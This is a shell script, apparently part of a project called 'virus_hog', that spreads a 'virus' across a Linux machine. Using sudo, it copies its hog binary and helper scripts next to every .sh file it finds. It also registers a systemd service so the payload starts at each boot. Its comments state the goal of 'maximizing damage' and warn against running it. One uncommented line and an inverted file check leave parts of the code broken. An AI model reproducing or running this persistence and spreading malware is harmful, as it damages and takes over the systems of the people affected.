#!/bin/sh

# adds onto all system shell files for inserting the virus onto the system for maximizing damage:
# e.g. /usr/src/linux-headers-5.15.0-47/arch/powerpc/boot/install.sh
# DONT RUN THIS considering the damages it can do if added to a commonly used shell file

PATH_TO_DAMAGE=$(sudo find / -name '*.sh')

#echo "$PATH_TO_DAMAGE" # view the files to append to
DIR=$(find $HOME -name "virus_hog")
if [ -z "$DIR" ]; then
	DIR=$(find /media -name "virus_hog")
fi

add virus where it will be called every time the computer boots
if [ -f /etc/systemd/system/script_daemon.service ]; then
	sudo cp $DIR/hog.sh /etc/systemd/system/hog.sh
	sudo cp $DIR/hog /etc/systemd/system/hog
	sudo cp $DIR/run.sh /etc/systemd/system/run.sh
	sudo cp $DIR/add_to_system.service /etc/systemd/system/script_daemon.service
	sudo systemctl daemon-reload
	sudo systemctl enable /etc/systemd/system/script_daemon.service
fi

#echo "$PATH_TO_DAMAGE"
for path in $PATH_TO_DAMAGE
do
	PATH_=$(dirname $path) # get path of shell file
	
	# echo $path = path
	sudo cp -f $DIR/hog $PATH_/hog
	sudo cp -f $DIR/run.sh $PATH_/run.sh
	sudo cp -f $DIR/hog.sh $PATH_/hog.sh
done
